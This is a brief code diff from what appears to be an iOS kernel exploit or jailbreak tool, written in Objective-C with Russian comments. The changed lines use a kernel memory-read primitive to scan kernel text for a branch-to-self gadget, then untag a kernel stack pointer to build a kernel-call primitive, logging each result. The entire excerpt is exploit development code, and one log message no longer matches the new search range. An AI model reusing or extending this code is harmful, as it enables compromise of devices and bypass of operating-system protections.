@@ -2451,8 +2451,8 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                     uint64_t kstack = kp_untag_ptr(early_kread64(hK + 0xe8));
                                     uint64_t spin = 0;
                                     uint64_t kb2 = kconstant(base);
-                                    // 2.0.125: диапазон 0x20000 вместо 0x200000 — гаджет в начале __TEXT
-                                    for (uint64_t a = kb2; a < kb2 + 0x20000 && !spin; a += 4)
+                                    // 2.0.126: гаджет на base+0x15xxxxx, диапазон 0x200000
+                                    for (uint64_t a = kb2 + 0x100000; a < kb2 + 0x300000 && !spin; a += 4)
                                         if ((uint32_t)early_kread64(a) == 0x14000000) spin = a;
                                     { NSString *s = [NSString stringWithFormat:@"spin=%#llx (searched 0x20000)\n", (unsigned long long)spin]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
                                     { NSString *s = [NSString stringWithFormat:@"kstack=%#llx spin=%#llx\n", (unsigned long long)kstack, (unsigned long long)spin]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
